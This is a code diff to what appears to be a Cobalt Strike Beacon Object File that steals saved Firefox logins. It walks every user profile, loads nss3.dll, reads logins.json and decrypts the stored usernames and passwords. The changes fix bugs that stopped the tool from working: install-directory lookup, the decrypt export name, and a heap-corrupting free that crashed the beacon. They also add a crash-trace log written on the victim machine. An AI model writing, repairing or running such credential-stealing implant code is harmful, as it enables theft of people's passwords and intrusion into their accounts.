@@ -1429,39 +1429,115 @@ typedef struct {
     PFN_SECITEM_FreeItem      SECITEM_FreeItem;
 } NssApi;
 
+/* ---- optional on-disk debug log (survives a BOF crash -> pinpoints the
+ *      failing call). Compiled in only with -DPWK_DEBUG. After a crash, read
+ *      %TEMP%\pwk_dbg.log on the target: the LAST line is the call that
+ *      faulted. BeaconPrintf is lost on a crash (delivered only when go()
+ *      returns), so this file is the only durable trace. */
+#ifdef PWK_DEBUG
+static void dbglog(const char *msg) {
+    char tmp[MAX_PATH], path[MAX_PATH]; HANDLE h; DWORD wr;
+    if (!KERNEL32$GetTempPathA(sizeof(tmp), tmp)) return;
+    MSVCRT$_snprintf(path, sizeof(path), "%spwk_dbg.log", tmp);
+    path[sizeof(path) - 1] = 0;
+    h = KERNEL32$CreateFileA(path, FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (h == INVALID_HANDLE_VALUE) return;
+    KERNEL32$WriteFile(h, msg, (DWORD)MSVCRT$strlen(msg), &wr, NULL);
+    KERNEL32$WriteFile(h, "\r\n", 2, &wr, NULL);
+    KERNEL32$CloseHandle(h);
+}
+#else
+static __inline void dbglog(const char *msg) { (void)msg; }
+#endif
+
 static int ResolveFirefoxDir(char *outDir, int cap) {
-    HKEY hFirefox = NULL, hMain = NULL, hVer = NULL;
+    HKEY hFirefox = NULL, hMain = NULL;
     LONG r; DWORD i;
-    const wchar_t *roots[2] = { L"SOFTWARE\\Mozilla\\Mozilla Firefox", L"SOFTWARE\\WOW6432Node\\Mozilla\\Mozilla Firefox" };
+    const wchar_t *roots[2] = { L"SOFTWARE\\Mozilla\\Mozilla Firefox",
+                                L"SOFTWARE\\WOW6432Node\\Mozilla\\Mozilla Firefox" };
+
+    /* 1 – Try registry (both 64‑bit and 32‑bit hives) */
     for (i = 0; i < 2 && !hMain; i++) {
         r = ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, roots[i], 0, KEY_READ, &hFirefox);
         if (r) { hFirefox = NULL; continue; }
-        /* enumerate version subkeys */
-        {
-            DWORD idx = 0; wchar_t vname[128];
-            while (hMain == NULL && ADVAPI32$RegEnumKeyW(hFirefox, idx++, vname, 128) == 0) {
-                wchar_t sub[256];
-                MSVCRT$_snwprintf(sub, 256, L"%s\\Main", vname);
-                if (ADVAPI32$RegOpenKeyExW(hFirefox, sub, 0, KEY_READ, &hMain) == 0) break;
-            }
+
+        DWORD idx = 0; wchar_t vname[128];
+        while (hMain == NULL && ADVAPI32$RegEnumKeyW(hFirefox, idx++, vname, 128) == 0) {
+            wchar_t sub[256];
+            MSVCRT$_snwprintf(sub, 256, L"%s\\Main", vname);
+            if (ADVAPI32$RegOpenKeyExW(hFirefox, sub, 0, KEY_READ, &hMain) == 0) break;
         }
         if (hFirefox) ADVAPI32$RegCloseKey(hFirefox);
     }
-    if (!hMain) return 0;
-    {
+
+    if (hMain) {
         wchar_t pathW[MAX_PATH]; DWORD len = sizeof(pathW); DWORD type = 0;
-        if (ADVAPI32$RegQueryValueExW(hMain, L"path", NULL, &type, (LPBYTE)pathW, &len) == 0 && type == REG_SZ) {
-            /* truncate at last backslash -> install dir */
+        int gotInstall = 0, gotExe = 0;
+        /* "Install Directory" is ALREADY a directory — do NOT strip a path
+         * component. The old code truncated every value at the last '\',
+         * turning "C:\Program Files\Mozilla Firefox" into "C:\Program Files",
+         * so SetDllDirectoryW pointed at the wrong dir and LoadLibraryExW
+         * nss3.dll failed with 126 (ERROR_MOD_NOT_FOUND). Only "PathToExe"
+         * (...\firefox.exe) needs the trailing file name stripped. */
+        if (ADVAPI32$RegQueryValueExW(hMain, L"Install Directory", NULL, &type, (LPBYTE)pathW, &len) == 0 && type == REG_SZ) {
+            gotInstall = 1;
+        } else {
+            len = sizeof(pathW); type = 0;
+            if (ADVAPI32$RegQueryValueExW(hMain, L"PathToExe", NULL, &type, (LPBYTE)pathW, &len) == 0 && type == REG_SZ)
+                gotExe = 1;
+        }
+        if (gotInstall || gotExe) {
             int j, last = -1;
             pathW[len / sizeof(wchar_t)] = 0;
-            for (j = 0; pathW[j]; j++) if (pathW[j] == L'\\') last = j;
-            if (last > 0) pathW[last] = 0;
+            if (gotExe) {
+                for (j = 0; pathW[j]; j++) if (pathW[j] == L'\\') last = j;
+                if (last > 0) pathW[last] = 0;
+            } else {
+                /* Install Directory: strip only a trailing backslash, if any */
+                j = 0; while (pathW[j]) j++;
+                if (j > 0 && pathW[j - 1] == L'\\') pathW[j - 1] = 0;
+            }
             KERNEL32$WideCharToMultiByte(CP_ACP, 0, pathW, -1, outDir, cap, NULL, NULL);
+            outDir[cap - 1] = 0;
             ADVAPI32$RegCloseKey(hMain);
+            /* verify nss3.dll actually lives here; if the registry value is
+             * stale/wrong, fall through to the filesystem fallback instead of
+             * returning a dir LoadLibraryExW will fail on. */
+            {
+                char dll[320];
+                MSVCRT$_snprintf(dll, sizeof(dll), "%s\\nss3.dll", outDir);
+                dll[sizeof(dll) - 1] = 0;
+                if (KERNEL32$GetFileAttributesA(dll) != INVALID_FILE_ATTRIBUTES)
+                    return 1;
+            }
+        } else {
+            ADVAPI32$RegCloseKey(hMain);
+        }
+    }
+
+    /* 2 – File‑system fallback (always reachable now) */
+    const char *cands[3] = {
+        "C:\\Program Files\\Mozilla Firefox",
+        "C:\\Program Files (x86)\\Mozilla Firefox",
+        NULL
+    };
+    char expanded[300];
+    /* Native 64‑bit Program Files (invisible to 32‑bit processes, harmless on x64 beacon) */
+    if (KERNEL32$ExpandEnvironmentStringsA("%ProgramW6432%\\Mozilla Firefox", expanded, sizeof(expanded))) {
+        cands[2] = expanded;
+    }
+
+    int ci;
+    for (ci = 0; ci < 3 && cands[ci]; ci++) {
+        char dll[300];
+        MSVCRT$_snprintf(dll, sizeof(dll), "%s\\nss3.dll", cands[ci]);
+        dll[sizeof(dll) - 1] = 0;
+        if (KERNEL32$GetFileAttributesA(dll) != INVALID_FILE_ATTRIBUTES) {
+            MSVCRT$_snprintf(outDir, cap, "%s", cands[ci]);
+            outDir[cap - 1] = 0;
             return 1;
         }
     }
-    ADVAPI32$RegCloseKey(hMain);
     return 0;
 }
 
@@ -1535,15 +1611,20 @@ static int NssDecrypt(NssApi *n, const char *b64, char *out, int outCap) {
     if (!raw || !dl) { if (raw) intFree(raw); return 0; }
     in.type = siBuffer; in.data = raw; in.len = (unsigned int)dl;
     res.type = siBuffer; res.data = NULL; res.len = 0;
+    dbglog("FX pre SDR");
     s = n->PK11SDRDecrypt(&in, &res, NULL);
+    dbglog("FX post SDR");
     if (s == 0 && res.data && res.len) {
         int m = ((int)res.len < outCap - 1) ? (int)res.len : outCap - 1, i;
         for (i = 0; i < m; i++) out[i] = (char)res.data[i];
         out[m] = 0;
         ret = 1;
     }
-    /* NSS allocated res.data; free via SECITEM_FreeItem if available, else leak small */
-    if (n->SECITEM_FreeItem && res.data) n->SECITEM_FreeItem(&res, 1);
+    /* NSS allocated res.data; free ONLY the data buffer (freeit=0). Do NOT pass
+     * freeit=1 — that makes NSS PORT_Free() the SECItem struct itself, and `res`
+     * lives on THIS stack, so PORT_Free(&res) corrupts the heap and crashes the
+     * beacon. (This was the crash: trace ended at "FX post SDR".) */
+    if (n->SECITEM_FreeItem && res.data) n->SECITEM_FreeItem(&res, 0);
     intFree(raw);
     return ret;
 }
@@ -1556,10 +1637,15 @@ static void ProcessOneFirefoxProfile(NssApi *n, const char *profile, const char 
     DWORD sz = 0, rd = 0; char *json = NULL; char *cursor;
     *count = 0; *dec = 0;
 
-    if (n->NSS_Init(profile) != 0) { BeaconPrintf(CALLBACK_ERROR, "[!] NSS_Init(\"%s\") failed", profile); return; }
+    dbglog("FX pre NSS_Init");
+    if (n->NSS_Init(profile) != 0) { BeaconPrintf(CALLBACK_ERROR, "[!] NSS_Init(\"%s\") failed", profile); dbglog("FX NSS_Init FAIL"); return; }
+    dbglog("FX NSS_Init ok");
     slot = n->PK11_GetInternalKeySlot();
-    if (!slot) { BeaconPrintf(CALLBACK_ERROR, "[!] PK11_GetInternalKeySlot failed"); n->NSS_Shutdown(); return; }
+    dbglog("FX GetSlot ret");
+    if (!slot) { BeaconPrintf(CALLBACK_ERROR, "[!] PK11_GetInternalKeySlot failed"); n->NSS_Shutdown(); dbglog("FX GetSlot FAIL"); return; }
+    dbglog("FX pre Auth");
     n->PK11_Authenticate(slot, FALSE, NULL);
+    dbglog("FX Auth done");
 
     MSVCRT$_snprintf(loginsPath, sizeof(loginsPath), "%s\\logins.json", profile);
     {
@@ -1571,6 +1657,7 @@ static void ProcessOneFirefoxProfile(NssApi *n, const char *profile, const char 
         KERNEL32$CloseHandle(h);
         json[sz] = 0;
     }
+    dbglog("FX logins.json read");
 
     /* iterate over every "encryptedPassword" occurrence; for each, look back for
      * the nearest "hostname" and "encryptedUsername". Firefox field order is
@@ -1637,8 +1724,11 @@ static void firefox_user_cb(const char *profA, void *ctx) {
     MSVCRT$_snprintf(roamingBase, sizeof(roamingBase), "%s\\AppData\\Roaming", profA);
     if (!FindFirefoxProfile(roamingBase, profile, sizeof(profile))) return;  /* no Firefox for this user — skip */
     e->foundAny = 1;
+    dbglog("FX profile found");
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Firefox profile @ %s : %s", profA, profile);
+    dbglog("FX pre ProcessOne");
     ProcessOneFirefoxProfile(e->n, profile, profA, &count, &dec);
+    dbglog("FX post ProcessOne");
 }
 
 static void ProcessFirefox(DWORD unused) {
@@ -1649,7 +1739,7 @@ static void ProcessFirefox(DWORD unused) {
     (void)unused;
 
     MSVCRT$memset(&n, 0, sizeof(n));
-    if (!ResolveFirefoxDir(fxDir, sizeof(fxDir))) { BeaconPrintf(CALLBACK_ERROR, "[!] Firefox install dir not found in registry"); return; }
+    if (!ResolveFirefoxDir(fxDir, sizeof(fxDir))) { BeaconPrintf(CALLBACK_ERROR, "[!] Firefox install dir not found (registry + Program Files fallback)"); return; }
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Firefox install dir: %s", fxDir);
 
     KERNEL32$MultiByteToWideChar(CP_ACP, 0, fxDir, -1, fxDirW, sizeof(fxDirW) / sizeof(wchar_t));
@@ -1657,21 +1747,25 @@ static void ProcessFirefox(DWORD unused) {
     hNss = KERNEL32$LoadLibraryExW(L"nss3.dll", NULL, LOAD_WITH_ALTERED_SEARCH_PATH);
     KERNEL32$SetDllDirectoryW(NULL);
     if (!hNss) { BeaconPrintf(CALLBACK_ERROR, "[!] LoadLibrary nss3.dll failed (%lu)", KERNEL32$GetLastError()); return; }
+    dbglog("FX nss3 loaded");
 
     n.NSS_Init               = (PFN_NSS_Init)              KERNEL32$GetProcAddress(hNss, "NSS_Init");
     n.NSS_Shutdown           = (PFN_NSS_Shutdown)          KERNEL32$GetProcAddress(hNss, "NSS_Shutdown");
     n.PK11_GetInternalKeySlot= (PFN_PK11_GetInternalKeySlot)KERNEL32$GetProcAddress(hNss, "PK11_GetInternalKeySlot");
     n.PK11_FreeSlot          = (PFN_PK11_FreeSlot)         KERNEL32$GetProcAddress(hNss, "PK11_FreeSlot");
     n.PK11_Authenticate      = (PFN_PK11_Authenticate)    KERNEL32$GetProcAddress(hNss, "PK11_Authenticate");
-    n.PK11SDRDecrypt         = (PFN_PK11SDRDecrypt)        KERNEL32$GetProcAddress(hNss, "PK11SDRDecrypt");
+    n.PK11SDRDecrypt         = (PFN_PK11SDRDecrypt)        KERNEL32$GetProcAddress(hNss, "PK11SDR_Decrypt");
     n.SECITEM_FreeItem       = (PFN_SECITEM_FreeItem)      KERNEL32$GetProcAddress(hNss, "SECITEM_FreeItem");
 
     if (!n.NSS_Init || !n.PK11_GetInternalKeySlot || !n.PK11_Authenticate || !n.PK11SDRDecrypt) {
         BeaconPrintf(CALLBACK_ERROR, "[!] nss3.dll missing required exports"); KERNEL32$FreeLibrary(hNss); return;
     }
+    dbglog("FX exports resolved");
 
     ec.n = &n; ec.foundAny = 0;
+    dbglog("FX enum begin");
     ForEachUserProfile(firefox_user_cb, &ec);
+    dbglog("FX enum done");
     if (!ec.foundAny) BeaconPrintf(CALLBACK_OUTPUT, "[*] firefox: no profile found on any user");
 
     KERNEL32$FreeLibrary(hNss);
